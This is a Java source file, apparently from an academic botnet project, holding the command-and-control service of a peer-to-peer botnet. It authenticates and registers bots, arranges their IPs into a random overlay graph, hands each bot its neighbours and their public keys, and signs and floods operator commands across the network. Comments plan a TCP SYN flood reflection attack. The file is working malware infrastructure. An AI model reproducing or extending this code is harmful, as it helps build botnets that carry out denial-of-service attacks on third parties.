package cs.sii.control.command;

import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.SignatureException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Set;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import org.jgrapht.UndirectedGraph;
import org.jgrapht.graph.DefaultEdge;
import org.jgrapht.graph.ListenableUndirectedGraph;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import cs.sii.bot.action.Auth;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.domain.SyncIpList;
import cs.sii.model.bot.Bot;
import cs.sii.model.user.User;
import cs.sii.network.request.CecRequest;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.crypto.CryptoUtils;
import cs.sii.service.dao.BotServiceImpl;
import cs.sii.service.dao.UserServiceImpl;

@Service("Commando")
public class Commando {

	@Autowired
	private Auth auth;
	
	@Autowired
	private CecRequest req;
	
	@Autowired
	private BotServiceImpl bServ;
	
	@Autowired
	private NetworkService nServ;
	
	@Autowired
	private UserServiceImpl userService;

	private UndirectedGraph<IP, DefaultEdge> graph;

	@Autowired
	private CryptoPKI pki;
	@Autowired
	private CryptoUtils crypto;
	

	/**
	 * 
	 */
	public Commando() {
		super();
	}

	/**
	 * 
	 */
	public void initializeCeC() {
		nServ.updateDnsInformation();
		graph = createNetworkP2P();
		System.out.println("blab " + graph);
		

	}

	/**
	 * @param nodes
	 * @return
	 */
	private Integer calculateK(Integer nodes) {
		return (int) Math.ceil(Math.log10(nodes + 1));
	}

	/**
	 * @return
	 */
	@SuppressWarnings("unchecked")
	public UndirectedGraph<IP, DefaultEdge> createNetworkP2P() {
		// creo grafo partenza
		graph = new ListenableUndirectedGraph<IP, DefaultEdge>(DefaultEdge.class);
		List<Bot> bots = bServ.findAll();

		ArrayList<IP> nodes = new ArrayList<IP>();
		bots.forEach(bot -> nodes.add(new IP(bot.getIp())));

		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
				new SecureRandom(), true, false);
		MyVertexFactory<IP> nodeIp = new MyVertexFactory<IP>((List<IP>) nodes.clone(), new SecureRandom());
		g2.generateConnectedGraph(graph, nodeIp, null, calculateK(nodes.size()));
		for (IP ip2 : nodes) {
			System.out.println("gli archi di  " + graph.degreeOf(ip2));
		}
		System.out.println("graph" + graph);
		System.out.println("gdegree " + calculateK(nodes.size()));
		return graph;
	}

	/**
	 * @return
	 */
	@SuppressWarnings("unchecked")
	public UndirectedGraph<IP, DefaultEdge> updateNetworkP2P() {

		List<Bot> bots = bServ.findAll();
		ArrayList<IP> nodes = new ArrayList<IP>();

		bots.forEach(bot -> nodes.add(new IP(bot.getIp())));

		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
				new SecureRandom(), true, false);
		ListenableUndirectedGraph<IP, DefaultEdge> graph2 = new ListenableUndirectedGraph<IP, DefaultEdge>(
				DefaultEdge.class);
		MyVertexFactory<IP> nodeIp2 = new MyVertexFactory<IP>((List<IP>) nodes.clone(), new SecureRandom());
		g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0, new SecureRandom(), true, false);
		g2.updateConnectedGraph(graph, graph2, nodeIp2, null, calculateK(nodes.size()));
		for (IP ip2 : nodes) {
			System.out.println("gli archi di  " + graph2.degreeOf(ip2));
		}
		System.out.println("graph" + graph2);
		System.out.println("gdegree " + calculateK(nodes.size()));
		this.graph=graph2;
		return graph;
	}

	/**
	 * @param idBot
	 * @return
	 */
	public Pairs<Long, Integer> authReq(String idBot) {
		Pairs<Long, Integer> response;
		Long keyNumber = new Long(auth.generateNumberText());
		Integer iterationNumber = new Integer(auth.generateIterationNumber());
		auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
		response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
		return response;
	}

	/**
	 * @param objects
	 * @return
	 */
	public String checkHmac(ArrayList<Object> objects) {
		String response = "";
		String idBot = objects.get(0).toString();
		String hashMac = objects.get(7).toString();
		Long keyNumber = auth.getBotSeed().get(idBot).getValue1();
		Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
		if (auth.findBotChallengeInfo(idBot)) {
			if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
				response = "Challenge OK";
				Bot bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
						objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
						objects.get(6).toString(), (PublicKey) objects.get(7),
						Boolean.parseBoolean(objects.get(8).toString()));
				bServ.save(bot);
			}
		}
		return response;
	}

	/**
	 * @param data
	 * @return
	 */
	public SyncIpList<IP, PublicKey> getNeighbours(String data) {
		String idBot;
		Bot bot = null;
		try {
			idBot = pki.getCrypto().decryptAES(data);
		} catch (InvalidKeyException | InvalidAlgorithmParameterException | IllegalBlockSizeException
				| BadPaddingException | NoSuchAlgorithmException | NoSuchPaddingException
				| UnsupportedEncodingException e) {
			System.out.println("failed to decrypt data");
			return null;
		}
		bot = bServ.searchBotId(idBot);
		if (bot == null) {
			return null;// non autenticato
		} else {
			if (graph.containsVertex(new IP(bot.getIp()))) {
				Set<DefaultEdge> neighbours = graph.edgesOf(new IP(bot.getIp()));
				if (neighbours.size() < calculateK(bServ.findAll().size())) {
					updateNetworkP2P();
				} 
			}else {
					updateNetworkP2P();
				}
		}
			
		Set<DefaultEdge> setEd = graph.edgesOf(new IP(bot.getIp()));
		DefaultEdge[] a = new DefaultEdge[setEd.size()];
		setEd.toArray(a);

		SyncIpList<IP, PublicKey> ipN = new SyncIpList<IP, PublicKey>();
		for (int i = 0; i < a.length; i++) {

			IP s = graph.getEdgeSource(a[i]);
			IP t = graph.getEdgeTarget(a[i]);

			if (!s.equals(bot.getIp())) {
				Bot sB = bServ.searchBotIP(s);
				ipN.add(new Pairs<IP, PublicKey>(new IP(sB.getIp()), sB.getPubKey()));
			}
			if (!t.equals(bot.getIp())) {
				Bot tB = bServ.searchBotIP(t);
				ipN.add(new Pairs<IP, PublicKey>(new IP(tB.getIp()), tB.getPubKey()));
			}
		}
		return ipN;
	}


// TODO inserire metodi che inviano i comandi alla rete a comando dal sito

// attaca tcp syn flood reflection
//
// invia comandi ricevuti da pannello al vicinato

// Differenziare comandi per il singolo ai comandi per la rete(es sleep per un
// bot, attacco per la rete)


@Async
public void flooding(String cmd, String userSSoID) {
	
	User user=userService.getUserRepository().findBySsoId(userSSoID);
	if(user!=null){
		
		String msg="";
		// aggiungi nonce time.millis
		Long milli = System.currentTimeMillis();
	
		Random rand=new SecureRandom(milli.toString().getBytes());
		Integer nounce=rand.nextInt();
		
		String hashIdMsg=crypto.generateSha256(nounce.toString());
		
		String signature;
		try {
			signature = pki.signMessageRSA(hashIdMsg);
			msg=hashIdMsg+"|"+cmd+"|"+signature;
		} catch (InvalidKeyException | SignatureException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
		}
		
		startFlood(msg);
	}
}


public void startFlood(String msg){
	nServ.getNeighbours().getList().forEach((pairs)->{
			req.sendFloodToBot(pairs.getValue1().toString(), msg);
	});
}


}


// for (int i = 1; i < 20; i++) {
// nodes.add(new IP("192.168.0." + i));
// }
//
// // for(IP ip : nodes)
// for (IP ip2 : nodes) {
// System.out.println("gli archi di " + graph.degreeOf(ip2));
// }
//
// System.out.println("graph" + graph);
//
// System.out.println("gdegree " + calculateK(nodes.size()));

// System.out.println(" ||||||||||||||||||||||||||||||| ");
//
// nodes.clear();
// for (int i = 13; i < 10025; i++) {
// nodes.add(new IP("192.168.0." + i));
// }
